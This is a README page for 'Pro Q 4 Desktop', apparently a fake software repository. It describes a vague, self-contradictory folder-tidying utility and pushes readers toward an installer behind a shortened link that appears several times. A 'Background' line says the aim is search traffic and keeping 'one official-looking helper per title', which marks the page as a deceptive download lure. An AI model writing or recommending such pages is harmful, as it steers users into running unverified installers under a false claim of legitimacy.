![Pro Q 4 Desktop](assets/hero.png)

# Pro Q 4 Desktop

*Keep the Pro Q 4 data folder tidy before an update.*

## What Pro Q 4 Desktop is

**Pro Q 4 Desktop** is a Windows utility. A local helper for Pro Q 4 data folders, config and export files, and photo albums on Windows and macOS.

Patches move Pro Q 4 data paths without warning.

Use it when you want the change on this machine without opening a dozen Settings pages.

## What's included

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Locates Pro Q 4 user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Pro Q 4 is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/keith-boyd295/pro-q-4-desktop

MIT license. See `LICENSE`.
